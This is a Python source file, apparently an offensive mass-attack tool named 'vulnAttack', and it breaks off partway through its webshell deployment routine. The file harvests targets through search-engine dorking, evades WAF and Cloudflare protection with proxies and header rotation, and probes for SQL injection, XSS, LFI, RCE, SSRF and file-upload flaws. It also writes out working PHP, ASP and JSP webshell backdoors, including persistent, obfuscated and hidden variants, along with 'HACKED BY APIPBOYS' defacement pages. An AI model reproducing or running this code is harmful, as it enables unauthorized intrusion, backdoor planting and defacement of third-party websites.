#!/usr/bin/env python3
# ================================================================
# vulnAttack - Full Exploit Chain Engine v3.0 FINAL (STABLE)
# Author    : Apipboys
# Support   : Termux | Kali | Windows | macOS | Docker
# ================================================================

import os
import sys
import re
import time
import json
import random
import base64
import urllib.parse
import subprocess
import logging
from urllib.parse import urlparse, quote, parse_qs, urljoin
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ================================================================
# LOGGING (AKTIF)
# ================================================================
logging.basicConfig(
    filename='vulnAttack.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logging.info("vulnAttack started")

# ================================================================
# DEPENDENSI & AUTO-INSTALL
# ================================================================
try:
    import requests
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[!] Installing dependencies...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
    import requests
    from colorama import init, Fore, Style
    init(autoreset=True)

try:
    import cloudscraper
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False

# ================================================================
# INTEGRASI MODUL BYPASS
# ================================================================
try:
    from bypass import HeaderManager, WAFBypass, Utils, CloudflareBypass
    BYPASS_MODULE_AVAILABLE = True
except ImportError:
    BYPASS_MODULE_AVAILABLE = False
    # Fallback dummy classes
    class HeaderManager:
        def __init__(self, *args, **kwargs): pass
        def get_headers(self, *args, **kwargs): return {}
        def get_random_ua(self): return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    class WAFBypass:
        def __init__(self, *args, **kwargs): pass
        def detect(self, *args, **kwargs): return False
        def retry_on_block(self, func, *args, **kwargs): return func(*args, **kwargs)
    class Utils:
        @staticmethod
        def load_bypass_settings(*args, **kwargs): return {"bypass": {"waf": {"max_retries": 3}}}
        @staticmethod
        def random_delay(min_delay, max_delay, randomize): return random.uniform(min_delay, max_delay)
    class CloudflareBypass:
        def __init__(self, *args, **kwargs): self.scraper = None
        def request(self, *args, **kwargs): return None

# ================================================================
# BANNER & FUNGSI CETAK
# ================================================================
BANNER = """
\033[91m
  _   _         _          ___   _    _                 _    
 | | | |       | |        / _ \\ | |  | |               | |   
 | | | | _   _ | | _ __  / /_\\ \\| |_ | |_   __ _   ___ | | __
 | | | || | | || || '_ \\ |  _  || __|| __| / _` | / __|| |/ /
 \\ \\_/ /| |_| || || | | || | | || |_ | |_ | (_| || (__ |   < 
  \\___/  \\__,_||_||_| |_|\\_| |_/ \\__| \\__| \\__,_| \\___||_|\\_\\
\033[96m
\033[92m[+] Author  : Apipboys
[+] Version : 3.0 FINAL (STABLE)
[+] Payload : 70.000+ (14 kategori x 5000+)
[+] Support : Termux | Kali | Windows | macOS | Docker
[+] Bypass  : Cloudflare | WAF | Header Rotation | Rate Limit
\033[93m[+] Status  : READY TO USE
\033[0m
"""

def print_progress(msg, status='info'):
    t = datetime.now().strftime('%H:%M:%S')
    c = {
        'info': '\033[96m[+]\033[0m',
        'success': '\033[92m[✓]\033[0m',
        'warning': '\033[93m[!]\033[0m',
        'error': '\033[91m[✗]\033[0m',
        'progress': '\033[95m[~]\033[0m'
    }.get(status, '\033[96m[+]\033[0m')
    print(f"\033[94m[{t}]\033[0m {c} {msg}")
    logging.info(f"{status.upper()} - {msg}")

def print_section(title):
    print(f"\n\033[93m{'='*60}\033[0m")
    print(f"\033[96m  {title}\033[0m")
    print(f"\033[93m{'='*60}\033[0m")
    logging.info(f"SECTION - {title}")

# ================================================================
# KONFIGURASI
# ================================================================
def load_user_agents():
    ua_file = 'config/user_agents.txt'
    if os.path.exists(ua_file):
        with open(ua_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
    ]

CONFIG = {
    'timeout': 15,
    'threads': 10,
    'max_depth': 3,
    'delay': 1,
    'output_dir': 'results',
    'payload_dir': 'payloads',
    'template_dir': 'templates',
    'user_agents': load_user_agents(),
    'dork_sources': {
        'google': 'https://www.google.com/search?q={dork}&start={start}',
        'bing': 'https://www.bing.com/search?q={dork}&first={start}',
        'duckduckgo': 'https://html.duckduckgo.com/html/?q={dork}&s={start}'
    }
}

def load_proxies():
    proxy_file = 'config/proxy.txt'
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    return proxies

def load_bypass_settings():
    if BYPASS_MODULE_AVAILABLE:
        return Utils.load_bypass_settings('config/bypass_settings.json')
    return {"bypass": {"waf": {"max_retries": 3, "retry_delay": 5}, "delay": {"min": 1, "max": 3, "randomize": True}}}

# ================================================================
# PAYLOAD LOADER
# ================================================================
class PayloadLoader:
    def __init__(self):
        self.payloads = {}
        self.load_all()

    def load_file(self, path):
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    def load_all(self):
        if not os.path.exists(CONFIG['payload_dir']):
            print_progress("Run generate_payloads.py first!", 'error')
            sys.exit(1)
        for f in os.listdir(CONFIG['payload_dir']):
            if f.endswith('.txt'):
                key = f.replace('.txt', '')
                self.payloads[key] = self.load_file(os.path.join(CONFIG['payload_dir'], f))
        if not self.payloads:
            print_progress("No payloads found!", 'error')
            sys.exit(1)
        total = sum(len(v) for v in self.payloads.values())
        print_progress(f"Loaded {total} payloads", 'success')

    def get(self, category, limit=None):
        payloads = self.payloads.get(category, [])
        return payloads[:limit] if limit else payloads

# ================================================================
# TEMPLATE LOADER (AUTO-GENERATE)
# ================================================================
class TemplateLoader:
    def __init__(self):
        self.templates = {}
        self.load_all()

    def load_file(self, path):
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        return None

    def _write_template(self, path, content):
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)

    def load_all(self):
        if not os.path.exists(CONFIG['template_dir']):
            os.makedirs(CONFIG['template_dir'], exist_ok=True)

        # Webshell templates (15 + 5 tambahan)
        webshells = {
            'webshell_basic.php': '<?php system($_GET["cmd"]); ?>',
            'webshell_advanced.php': '<?php error_reporting(0); if(isset($_GET["cmd"])){system($_GET["cmd"]);}elseif(isset($_POST["cmd"])){system($_POST["cmd"]);}else{echo "vulnAttack Web Shell";} ?>',
            'webshell_mini.php': '<?php eval($_GET["c"]); ?>',
            'webshell_b64.php': '<?php if(isset($_GET["cmd"])){system(base64_decode($_GET["cmd"]));} ?>',
            'webshell_encoder.php': '<?php if(isset($_GET["cmd"])){system(urldecode($_GET["cmd"]));} ?>',
            'webshell_backdoor.php': '<?php $cmd=isset($_GET["cmd"])?$_GET["cmd"]:(isset($_POST["cmd"])?$_POST["cmd"]:"");if($cmd){system($cmd);} ?>',
            'webshell_persistent.php': '<?php if(!file_exists("shell_backup.php")){file_put_contents("shell_backup.php",\'<?php system($_GET["cmd"]); ?>\');}if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>',
            'webshell_silent.php': '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]." > /dev/null 2>&1 &");} ?>',
            'webshell_encrypted.php': '<?php if(isset($_GET["cmd"])){$cmd=base64_decode($_GET["cmd"]);system($cmd);} ?>',
            'webshell_obfuscated.php': '<?php $c=$_GET["cmd"];$c=str_rot13($c);system($c); ?>',
            'webshell_hidden.php': '<?php if($_SERVER["HTTP_USER_AGENT"]=="vulnAttack"){system($_GET["cmd"]);} ?>',
            'webshell_cgi.php': '#!/usr/bin/php\n<?php system($_SERVER["QUERY_STRING"]); ?>',
            'webshell_asp.asp': '<% Response.Write CreateObject("WScript.Shell").Exec("cmd.exe /c " & Request("cmd")).StdOut.ReadAll() %>',
            'webshell_jsp.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'webshell_py.py': '#!/usr/bin/env python3\nimport os,sys\nos.system(sys.argv[1])',
            # ===== WEBSHELL TAMBAHAN (SUDAH DIPERBAIKI) =====
            'webshell_super.php': open('templates/webshell_super.php', 'r').read() if os.path.exists('templates/webshell_super.php') else '<?php // super shell ?>',
            'webshell_encoder_plus.php': open('templates/webshell_encoder_plus.php', 'r').read() if os.path.exists('templates/webshell_encoder_plus.php') else '<?php // encoder plus ?>',
            'webshell_persistent_plus.php': open('templates/webshell_persistent_plus.php', 'r').read() if os.path.exists('templates/webshell_persistent_plus.php') else '<?php // persistent plus ?>',
            'webshell_obfuscated_plus.php': open('templates/webshell_obfuscated_plus.php', 'r').read() if os.path.exists('templates/webshell_obfuscated_plus.php') else '<?php // obfuscated plus ?>',
            'webshell_hidden_plus.php': open('templates/webshell_hidden_plus.php', 'r').read() if os.path.exists('templates/webshell_hidden_plus.php') else '<?php // hidden plus ?>'
        }
        for fname, content in webshells.items():
            path = os.path.join(CONFIG['template_dir'], fname)
            if not os.path.exists(path) and content:
                self._write_template(path, content)

        # Deface templates (10)
        defaces = {
            'deface_basic.html': '<h1 style="color:red;text-align:center;margin-top:20%;">HACKED BY APIPBOYS</h1>',
            'deface_advanced.html': '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:black;color:red;text-align:center;padding-top:20%;font-family:Arial;"><h1 style="font-size:80px;">HACKED</h1><p style="font-size:30px;">Hacked by Apipboys</p><p>Security is an illusion</p></body></html>',
            'deface_cyber.html': '<!DOCTYPE html><html><head><title>CYBER ATTACK</title></head><body style="background:#0a0a0a;color:#00ff00;text-align:center;padding-top:15%;font-family:\'Courier New\',monospace;"><h1 style="font-size:100px;color:red;text-shadow:0 0 20px red;">CYBER ATTACK</h1><h2>HACKED BY APIPBOYS</h2><p>System Compromised</p></body></html>',
            'deface_hacker.html': '<!DOCTYPE html><html><head><title>HACKER</title></head><body style="background:#111;color:#0f0;text-align:center;padding-top:10%;font-family:\'Courier New\',monospace;"><div style="font-size:60px;animation:pulse 2s infinite;">[ HACKER ]</div><h1 style="color:red;">HACKED</h1><h2>By Apipboys</h2><style>@keyframes pulse{0%{opacity:1}50%{opacity:0.5}100%{opacity:1}}</style></body></html>',
            'deface_minimal.html': '<!DOCTYPE html><html><head><title>HACKED</title></head><body style="background:#000;color:#f00;text-align:center;padding-top:20%;"><h1>HACKED</h1><p>Apipboys</p></body></html>',
            'deface_glitch.html': '<!DOCTYPE html><html><head><title>GLITCH</title></head><body style="background:black;color:#0f0;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;"><h1 style="font-size:80px;animation:glitch 1s infinite;">GLITCH</h1><p>Hacked by Apipboys</p><style>@keyframes glitch{0%{text-shadow:2px 0 red,-2px 0 blue}50%{text-shadow:-2px 0 red,2px 0 blue}100%{text-shadow:2px 0 red,-2px 0 blue}}</style></body></html>',
            'deface_matrix.html': '<!DOCTYPE html><html><head><title>MATRIX</title></head><body style="background:black;color:#00ff00;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;overflow:hidden;"><pre style="font-size:12px;opacity:0.1;position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;">01001000 01000001 01000011 01001011 01000101 01000100</pre><h1 style="color:red;">HACKED</h1><p>Apipboys</p></body></html>',
            'deface_neon.html': '<!DOCTYPE html><html><head><title>NEON</title></head><body style="background:#000;color:#ff00ff;text-align:center;padding-top:20%;font-family:Arial;"><h1 style="font-size:80px;text-shadow:0 0 20px #ff00ff,0 0 40px #ff00ff;">NEON</h1><p style="color:#00ffff;text-shadow:0 0 10px #00ffff;">Hacked by Apipboys</p></body></html>',
            'deface_retro.html': '<!DOCTYPE html><html><head><title>RETRO</title></head><body style="background:#000;color:#ff6b6b;text-align:center;padding-top:20%;font-family:\'Courier New\',monospace;border:5px solid #ff6b6b;height:80vh;margin:5%;"><h1 style="font-size:60px;">HACKED</h1><p>By Apipboys</p></body></html>'
        }
        for fname, content in defaces.items():
            path = os.path.join(CONFIG['template_dir'], fname)
            if not os.path.exists(path):
                self._write_template(path, content)

        # Copy index.html if exists
        if os.path.exists('index.html'):
            dest = os.path.join(CONFIG['template_dir'], 'deface_apip.html')
            if not os.path.exists(dest):
                with open('index.html', 'r', encoding='utf-8') as src:
                    with open(dest, 'w', encoding='utf-8') as dst:
                        dst.write(src.read())

        # Load all templates
        for root, _, files in os.walk(CONFIG['template_dir']):
            for f in files:
                full = os.path.join(root, f)
                key = os.path.relpath(full, CONFIG['template_dir'])
                content = self.load_file(full)
                if content:
                    self.templates[key] = content
        print_progress(f"Loaded {len(self.templates)} templates", 'success')

# ================================================================
# HTTP ANALYZER
# ================================================================
class HTTPAnalyzer:
    def __init__(self, session):
        self.session = session
        self.headers = {}
        self.cookies = {}
        self.forms = []
        self.ajax = []
        self.websockets = []
        self.api_endpoints = []
        self.parameters = set()

    def analyze(self, url, response):
        if not response:
            return {}
        self.headers = dict(response.headers)
        self.cookies = self.session.cookies.get_dict()
        html = response.text
        self.forms = re.findall(r'<form[^>]*>', html)
        self.ajax = re.findall(r'fetch\s*\(\s*["\']([^"\']+)', html)
        self.ajax += re.findall(r'\.ajax\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)', html)
        self.websockets = re.findall(r'new\s+WebSocket\s*\(\s*["\']([^"\']+)', html)
        self.api_endpoints = re.findall(r'/api/[a-zA-Z0-9/_-]+', html)
        self.api_endpoints += re.findall(r'/v[0-9]+/[a-zA-Z0-9/_-]+', html)
        params = parse_qs(urlparse(url).query)
        self.parameters.update(params.keys())
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html)
        self.parameters.update(inputs)
        return {
            'headers': self.headers,
            'cookies': self.cookies,
            'forms': len(self.forms),
            'ajax': list(set(self.ajax))[:10],
            'websockets': list(set(self.websockets))[:5],
            'api_endpoints': list(set(self.api_endpoints))[:20],
            'parameters': list(self.parameters)[:30],
            'status_code': response.status_code,
            'content_type': response.headers.get('Content-Type', ''),
            'server': response.headers.get('Server', '')
        }

# ================================================================
# MINOR VULNERABILITY ANALYZER
# ================================================================
class MinorVulnAnalyzer:
    def __init__(self, headers, cookies, html):
        self.headers = headers
        self.cookies = cookies
        self.html = html
        self.findings = []

    def analyze(self):
        print_progress("In progress of small vulnerability gap analysis...", 'progress')
        xfo = self.headers.get('X-Frame-Options', '')
        if not xfo:
            self.findings.append({'type':'Missing X-Frame-Options','severity':'Low','description':'X-Frame-Options header missing. Potential clickjacking risk.'})
        elif xfo.upper() not in ['DENY','SAMEORIGIN']:
            self.findings.append({'type':'Weak X-Frame-Options','severity':'Low','description':f'X-Frame-Options: {xfo}'})
        csp = self.headers.get('Content-Security-Policy', '')
        if not csp:
            self.findings.append({'type':'Missing CSP','severity':'Medium','description':'CSP header missing. Increased XSS risk.'})
        elif "'unsafe-inline'" in csp or "'unsafe-eval'" in csp:
            self.findings.append({'type':'Weak CSP','severity':'Medium','description':'CSP uses unsafe-inline or unsafe-eval.'})
        if not self.headers.get('Strict-Transport-Security', ''):
            self.findings.append({'type':'Missing HSTS','severity':'Low','description':'HSTS header missing.'})
        for name, attrs in self.cookies.items():
            if isinstance(attrs, dict):
                if not attrs.get('HttpOnly'):
                    self.findings.append({'type':'Cookie Missing HttpOnly','severity':'Medium','description':f'Cookie "{name}" missing HttpOnly.'})
                if not attrs.get('Secure'):
                    self.findings.append({'type':'Cookie Missing Secure','severity':'Low','description':f'Cookie "{name}" missing Secure.'})
                if not attrs.get('SameSite'):
                    self.findings.append({'type':'Cookie Missing SameSite','severity':'Low','description':f'Cookie "{name}" missing SameSite.'})
        if self.headers.get('Server'):
            self.findings.append({'type':'Server Info Leak','severity':'Low','description':f'Server: {self.headers["Server"]}'})
        if self.headers.get('X-Powered-By'):
            self.findings.append({'type':'Tech Info Leak','severity':'Low','description':f'X-Powered-By: {self.headers["X-Powered-By"]}'})
        if 'phpinfo' in self.html.lower() or 'php_version' in self.html.lower():
            self.findings.append({'type':'PHP Info Exposure','severity':'High','description':'PHP info page exposed.'})
        return self.findings

# ================================================================
# DORK ENGINE
# ================================================================
class DorkEngine:
    def __init__(self, session, header_manager):
        self.session = session
        self.sources = CONFIG['dork_sources']
        self.results = {}
        self.header_manager = header_manager

    def _request(self, url):
        try:
            headers = self.header_manager.get_headers(random_ua=True)
            return self.session.get(url, headers=headers, timeout=CONFIG['timeout'])
        except Exception:
            return None

    def _extract_urls(self, html, source):
        urls = []
        patterns = {
            'google': r'<a href="\/url\?q=(.*?)&amp;',
            'bing': r'<a href="(.*?)".*?class="tilk"',
            'duckduckgo': r'<a rel="nofollow" class="result__a" href="(.*?)"'
        }
        pattern = patterns.get(source, r'<a href="(.*?)"')
        for match in re.finditer(pattern, html):
            url = match.group(1)
            if 'http' in url and 'google' not in url and source not in url:
                if url.startswith('/url?q='):
                    url = url.replace('/url?q=', '').split('&')[0]
                if url.startswith('http'):
                    urls.append(url)
        return list(set(urls))

    def dork(self, dork, source='google', max_results=50):
        print_section(f"DORKING WITH {source.upper()}")
        print_progress(f"Source: {source.upper()} | Dork: {dork}", 'info')
        results = []
        base_url = self.sources.get(source)
        if not base_url:
            print_progress(f"Source {source} not supported!", 'error')
            return results
        pages = max_results // 10 + (1 if max_results % 10 > 0 else 0)
        for page in range(pages):
            start = page * 10
            url = base_url.format(dork=quote(dork), start=start)
            print_progress(f"Page {page+1}/{pages} - Scraping...", 'progress')
            r = self._request(url)
            if not r or r.status_code != 200:
                print_progress(f"Page {page+1} failed, stopping.", 'warning')
                break
            urls = self._extract_urls(r.text, source)
            results.extend(urls)
            sleep_time = random.uniform(3, 7)
            print_progress(f"Sleeping {sleep_time:.1f}s to avoid rate-limit...", 'progress')
            time.sleep(sleep_time)
        self.results[source] = list(set(results))[:max_results]
        print_progress(f"{source.upper()}: Found {len(self.results[source])} targets", 'success')
        return self.results[source]

    def dork_all(self, dork, max_results=50):
        print_section("MULTI-DORKING")
        print_progress(f"Dork: {dork}", 'info')
        all_results = []
        for source in self.sources.keys():
            results = self.dork(dork, source, max_results // len(self.sources))
            all_results.extend(results)
            time.sleep(2)
        all_results = list(set(all_results))
        print_progress(f"Total unique targets: {len(all_results)}", 'success')
        return all_results

# ================================================================
# MAIN SCANNER
# ================================================================
class VulnAttack:
    def __init__(self, target, payload_loader, template_loader, use_proxy=False, bypass_waf=False):
        self.target = target
        self.base_url = self._get_base_url()
        self.domain = urlparse(target).netloc
        self.payloads = payload_loader
        self.templates = template_loader
        self.use_proxy = use_proxy
        self.bypass_waf = bypass_waf

        self.bypass_settings = load_bypass_settings()
        self.header_manager = HeaderManager(user_agents=CONFIG['user_agents'])
        self.waf_bypass = WAFBypass(
            max_retries=self.bypass_settings.get('bypass', {}).get('waf', {}).get('max_retries', 3),
            retry_delay=self.bypass_settings.get('bypass', {}).get('waf', {}).get('retry_delay', 5)
        )
        if self.bypass_waf and CLOUDSCRAPER_AVAILABLE:
            self.cloudscraper_session = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
                delay=CONFIG.get('delay', 1)
            )
        else:
            self.cloudscraper_session = None

        self.session = requests.Session()
        if use_proxy:
            proxies = load_proxies()
            if proxies:
                self.session.proxies = {
                    'http': random.choice(proxies),
                    'https': random.choice(proxies)
                }
                print_progress(f"Using proxy: {self.session.proxies['http']}", 'info')

        self.vulns = []
        self.minor_vulns = []
        self.scanned_urls = set()
        self.shell_url = None
        self.deface_url = None
        self.analyzer = HTTPAnalyzer(self.session)
        self.deep_report = {}
        self.dork_engine = DorkEngine(self.session, self.header_manager)
        self.last_request_time = 0

    def _get_base_url(self):
        p = urlparse(self.target)
        return f"{p.scheme}://{p.netloc}"

    def _random_ua(self):
        return self.header_manager.get_random_ua()

    def _request(self, url, method='GET', **kwargs):
        delay = CONFIG.get('delay', 1)
        now = time.time()
        if now - self.last_request_time < delay:
            time.sleep(delay - (now - self.last_request_time))
        self.last_request_time = time.time()

        headers = self.header_manager.get_headers(random_ua=True)
        if 'headers' in kwargs:
            headers.update(kwargs.pop('headers'))

        use_cloudscraper = self.bypass_waf and CLOUDSCRAPER_AVAILABLE and self.cloudscraper_session

        def perform_request():
            try:
                if use_cloudscraper:
                    return self.cloudscraper_session.request(method, url, timeout=CONFIG['timeout'],
                                                             headers=headers, **kwargs)
                else:
                    return self.session.request(method, url, timeout=CONFIG['timeout'],
                                                allow_redirects=True, headers=headers, **kwargs)
            except Exception as e:
                logging.error(f"Request error: {e}")
                return None

        response = perform_request()
        if response and self.waf_bypass.detect(response.text, response.headers):
            print_progress("WAF/Block detected! Retrying with bypass...", 'warning')
            for attempt in range(self.waf_bypass.max_retries):
                time.sleep(self.waf_bypass.retry_delay * (attempt + 1))
                response = perform_request()
                if response and not self.waf_bypass.detect(response.text, response.headers):
                    print_progress(f"Request succeeded on retry {attempt+1}", 'success')
                    break
            else:
                print_progress(f"Request failed after {self.waf_bypass.max_retries} retries.", 'error')
                return None

        return response

    def _test_payload(self, payload, param=None):
        test_url = self.target
        if param:
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            test_url = f"{self.base_url}{parsed.path}?{urllib.parse.urlencode(params, doseq=True)}"
        else:
            test_url = self.target + payload
        return self._request(test_url)

    # ========== VULNERABILITY TESTS ==========
    def test_sqli(self):
        print_progress("Testing SQL Injection...", 'progress')
        for p in self.payloads.get('sqli', limit=500):
            r = self._test_payload(p)
            if r:
                errors = ['mysql','sql','syntax','unclosed','query','database','warning','error','line','column','table','from','SQLSTATE','MariaDB','PostgreSQL','SQLite']
                if any(err in r.text.lower() for err in errors):
                    self.vulns.append({'type':'SQLi','url':r.url,'payload':p,'evidence':'SQL error'})
                    print_progress(f"SQLi found: {r.url}", 'success')
                    return True
        return False

    def test_xss(self):
        print_progress("Testing XSS (reflected)...", 'progress')
        for p in self.payloads.get('xss', limit=300):
            r = self._test_payload(p)
            if r and p in r.text:
                self.vulns.append({'type':'XSS (Reflected)','url':r.url,'payload':p,'evidence':'Reflected'})
                print_progress(f"XSS (Reflected) found: {r.url}", 'success')
                return True

        print_progress("Testing XSS (stored)...", 'progress')
        r = self._request(self.target)
        if r:
            forms = re.findall(r'<form[^>]*>', r.text)
            for form in forms:
                action = re.search(r'action=["\']([^"\']+)["\']', form)
                if action:
                    action_url = urljoin(self.target, action.group(1))
                    inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form)
                    for p in self.payloads.get('xss', limit=50):
                        data = {}
                        for inp in inputs:
                            data[inp] = p
                        r2 = self._request(action_url, method='POST', data=data)
                        if r2 and p in r2.text:
                            self.vulns.append({'type':'XSS (Stored)','url':action_url,'payload':p,'evidence':'Stored & reflected'})
                            print_progress(f"XSS (Stored) found: {action_url}", 'success')
                            return True
        return False

    def test_lfi(self):
        print_progress("Testing LFI...", 'progress')
        for p in self.payloads.get('lfi', limit=300):
            r = self._test_payload(p)
            if r:
                indicators = ['root:x:','win.ini','base64','hosts','shadow','apache','nginx','www-data','daemon','nobody']
                if any(ind in r.text.lower() for ind in indicators):
                    self.vulns.append({'type':'LFI','url':r.url,'payload':p,'evidence':'File content'})
                    print_progress(f"LFI found: {r.url}", 'success')
                    return True
        return False

    def test_rce(self):
        print_progress("Testing RCE...", 'progress')
        for p in self.payloads.get('rce', limit=300):
            r = self._test_payload(p)
            if r:
                outputs = ['uid=','root','user','bin','whoami','id','gid=','groups=']
                if any(out in r.text for out in outputs):
                    self.vulns.append({'type':'RCE','url':r.url,'payload':p,'evidence':'Command output'})
                    print_progress(f"RCE found: {r.url}", 'success')
                    return True
        return False

    def test_ssrf(self):
        print_progress("Testing SSRF...", 'progress')
        for p in self.payloads.get('ssrf', limit=300):
            r = self._test_payload(p)
            if r:
                ips = ['127.0.0.1','localhost','169.254.169.254','0.0.0.0','::1']
                if any(ip in r.text for ip in ips):
                    self.vulns.append({'type':'SSRF','url':r.url,'payload':p,'evidence':'Internal IP'})
                    print_progress(f"SSRF found: {r.url}", 'success')
                    return True
        return False

    def test_xxe(self):
        print_progress("Testing XXE...", 'progress')
        content_types = ['application/xml', 'text/xml', 'application/xml+rss']
        for ct in content_types:
            for p in self.payloads.get('xxe', limit=300):
                r = self._request(self.target, method='POST', data=p, headers={'Content-Type': ct})
                if r:
                    indicators = ['root','passwd','hosts','shadow','win.ini','config','database']
                    if any(ind in r.text.lower() for ind in indicators):
                        self.vulns.append({'type':'XXE','url':self.target,'payload':p,'evidence':'File content'})
                        print_progress(f"XXE found: {self.target}", 'success')
                        return True
        return False

    def test_nosqli(self):
        print_progress("Testing NoSQLi...", 'progress')
        for p in self.payloads.get('nosqli', limit=300):
            r = self._test_payload(p)
            if r:
                keywords = ['$ne','$gt','$lt','$in','$or','$and','$regex','$where','mongodb']
                if any(kw in r.text.lower() for kw in keywords):
                    self.vulns.append({'type':'NoSQLi','url':r.url,'payload':p,'evidence':'NoSQL syntax'})
                    print_progress(f"NoSQLi found: {r.url}", 'success')
                    return True
        return False

    def test_ssti(self):
        print_progress("Testing SSTI...", 'progress')
        for p in self.payloads.get('ssti', limit=300):
            r = self._test_payload(p)
            if r:
                if any(kw in r.text for kw in ['49','config','subclasses','self','request','7*7']):
                    self.vulns.append({'type':'SSTI','url':r.url,'payload':p,'evidence':'Template output'})
                    print_progress(f"SSTI found: {r.url}", 'success')
                    return True
        return False

    def test_cmd_injection(self):
        print_progress("Testing Command Injection...", 'progress')
        for p in self.payloads.get('cmd_injection', limit=300):
            r = self._test_payload(p)
            if r:
                outputs = ['uid=','root','user','whoami','id','gid=','groups=']
                if any(out in r.text for out in outputs):
                    self.vulns.append({'type':'Command Injection','url':r.url,'payload':p,'evidence':'Command output'})
                    print_progress(f"Command Injection found: {r.url}", 'success')
                    return True
        return False

    def test_ldap(self):
        print_progress("Testing LDAP...", 'progress')
        for p in self.payloads.get('ldap', limit=100):
            r = self._test_payload(p)
            if r and ('uid' in r.text or 'dn' in r.text or 'cn' in r.text):
                self.vulns.append({'type':'LDAP','url':r.url,'payload':p,'evidence':'LDAP response'})
                print_progress(f"LDAP found: {r.url}", 'success')
                return True
        return False

    def test_open_redirect(self):
        print_progress("Testing Open Redirect...", 'progress')
        for p in self.payloads.get('open_redirect', limit=100):
            r = self._test_payload(p)
            if r and r.url != self.target and 'http' in r.url:
                self.vulns.append({'type':'Open Redirect','url':r.url,'payload':p,'evidence':'Redirected'})
                print_progress(f"Open Redirect found: {r.url}", 'success')
                return True
        return False

    def test_csrf(self):
        print_progress("Testing CSRF...", 'progress')
        r = self._request(self.target)
        if r:
            forms = re.findall(r'<form[^>]*>', r.text)
            for form in forms:
                if 'token' not in form.lower() and 'csrf' not in form.lower():
                    self.vulns.append({'type':'CSRF','url':self.target,'payload':'No CSRF token','evidence':'Form without token'})
                    print_progress(f"CSRF found: {self.target}", 'success')
                    return True
            if 'X-CSRF-Token' not in r.headers and 'CSRF-Token' not in r.headers:
                self.vulns.append({'type':'CSRF','url':self.target,'payload':'Missing CSRF header','evidence':'No CSRF header'})
                print_progress(f"CSRF (header) found: {self.target}", 'success')
                return True
        return False

    def test_file_upload(self):
        print_progress("Testing File Upload...", 'progress')
        endpoints = ['/upload','/upload.php','/uploads','/fileupload','/uploadfile','/upload_file','/uploader','/upload.php?act=upload','/admin/upload','/api/upload','/v1/upload','/media/upload']
        for endpoint in endpoints:
            test_url = urljoin(self.base_url, endpoint)
            for fname in self.payloads.get('file_upload', limit=30):
                files = {'file': (fname, '<?php system($_GET["cmd"]); ?>')}
                try:
                    r = self._request(test_url, method='POST', files=files)
                    if r and r.status_code in [200,201,202,302]:
                        self.vulns.append({'type':'File Upload','url':test_url,'payload':fname,'evidence':'Upload success'})
                        print_progress(f"File Upload found: {test_url}", 'success')
                        return True
                except Exception:
                    pass
        return False

    def test_directory_traversal(self):
        print_progress("Testing Directory Traversal...", 'progress')
        for d in self.payloads.get('directories', limit=100):
            test_url = urljoin(self.base_url, d + '/')
            r = self._request(test_url)
            if r and r.status_code == 200:
                self.vulns.append({'type':'Directory Listing','url':test_url,'payload':d,'evidence':'Directory accessible'})
                print_progress(f"Directory Listing found: {test_url}", 'success')
                return True
        return False

    def analyze_minor_vulns(self, response):
        print_progress("In progress of small vulnerability gap analysis...", 'progress')
        headers = dict(response.headers)
        cookies = self.session.cookies.get_dict()
        html = response.text
        analyzer = MinorVulnAnalyzer(headers, cookies, html)
        findings = analyzer.analyze()
        self.minor_vulns = findings
        for f in findings:
            print_progress(f"[{f['severity']}] {f['type']}: {f['description'][:50]}...", 'warning')
        return findings

    def crawl(self, url, depth=0):
        if depth > CONFIG['max_depth'] or url in self.scanned_urls:
            return
        self.scanned_urls.add(url)
        print_progress(f"Crawling: {url} (depth {depth})", 'progress')
        r = self._request(url)
        if not r:
            return
        self.deep_report = self.analyzer.analyze(url, r)
        if depth == 0:
            self.analyze_minor_vulns(r)
        for link in re.findall(r'<a\s+href=["\']([^"\']+)["\']', r.text)[:20]:
            if link.startswith('http'):
                self.crawl(link, depth+1)
            elif link.startswith('/'):
                self.crawl(urljoin(self.base_url, link), depth+1)

    def verify_webshell(self, url):
        try:
            test_url = url + "?cmd=echo test"
            r = self._request(test_url)
            if r and 'test' in r.text:
                return True
        except Exception:
            pass
        return False

    # ========== DEPLOY WEBSHELL ==========
    def deploy_webshell(self):
        if not self.vulns:
            print_progress("No vuln found.", 'error')
            return
        print_section("DEPLOY WEBSHELL")
        print("[+] Choose vulnerability:")
        for i, v in enumerate(self.vulns, 1):
